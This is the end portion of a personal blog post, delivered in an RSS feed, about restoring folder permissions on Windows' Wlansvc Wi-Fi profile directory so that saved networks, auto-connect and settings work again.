<p>In Windows, all Wi-Fi profiles are stored in <code>C:\ProgramData\Microsoft\Wlansvc\Profiles</code>, so if the permissions are messed up, the system is most likely to crash or partially working. In my case, my laptop is able to connect to any Wi-Fi network, but it can&rsquo;t remember the Wi-Fi profile, so I have to re-enter my Wi-Fi password every time I want to connect. This caused by the system didn&rsquo;t have write access on <code>C:\ProgramData\Microsoft\Wlansvc\Profiles</code>.</p>
<p>But, after reverting the permissions of  the <code>Wlansvc</code> folder , the WiFi functionality/features returned back to normal.</p>
<p><div class="img-container"><img src="imgs/image-20210721055011183.png" alt="image-20210721055011183"  /></div>
</p>
<p>It also fixed the missing options and auto-connect.</p>
<p><div class="img-container"><img src="imgs/image-20210721055107535.png" alt="image-20210721055107535"  /></div>
</p>
<p>Also, there is no more error about &ldquo;<em>The system detected an overrun of a stack-based buffer in this  application. This overrun could potentially allow a malicious user to  gain control of this application</em>&rdquo; on the Wi-Fi settings.</p>
<blockquote>
<p>Padahal cuma mau reinstall Office, merembetnya kemana-mana 🙃.</p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p>That&rsquo;s all! I hope this post helps you too.</p>
<p>I will try to keep this post updated whenever I face the same problem related to Windows Permissions.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
